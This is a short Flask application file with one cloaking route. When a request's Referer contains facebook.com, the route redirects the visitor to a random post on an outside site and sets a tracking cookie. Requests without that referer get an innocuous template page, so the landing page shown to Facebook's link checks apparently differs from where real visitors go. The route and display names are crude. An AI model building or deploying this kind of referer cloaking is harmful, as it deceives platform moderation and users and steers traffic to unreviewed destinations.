from app import app
from flask import render_template, make_response
from flask import request, redirect
import random


@app.route("/p/dext4", subdomain='botgay')
def botgay():
    referer = request.headers.get('Referer')  # Check in Header Request. If it has Referer with facebook.com
    if referer is not None and 'facebook.com' in referer:
        post_number = random.randint(10, 5000)
        redirect_url = "http://ducdaudat.com/post/" + str(post_number)
        response = make_response(redirect(redirect_url))
        response.set_cookie('clixtz', '1', max_age=180)
        return response
    else:
        return render_template("index.html", member_name="Bot Gay")


@app.route("/")
def index():
    return "Hi world!"
